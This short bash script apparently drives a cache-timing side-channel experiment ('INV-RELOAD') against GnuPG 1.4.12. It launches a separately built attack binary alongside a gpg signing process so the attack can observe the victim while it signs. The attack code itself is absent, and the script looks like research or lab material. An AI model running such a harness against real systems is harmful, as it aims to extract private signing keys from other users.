#!/bin/bash

make clean
make

GnuPG=${HOME}/gnupg-1.4.12/bin/gpg
OFFSET=${HOME}/INV-RELOAD/doc/offset-gnupg-1.4.12.txt
CYCLE=$1

./attack ${GnuPG} ${OFFSET} ${CYCLE} &
ATTACK_PID=$!

sleep 0.001

${GnuPG} --yes --sign text.txt &
#(echo passphrase | ${GnuPG} --batch --yes --sign --passphrase-fd 0 text.txt) &
VICTIM_PID=$!

wait ${VICTIM_PID}
wait ${ATTACK_PID}
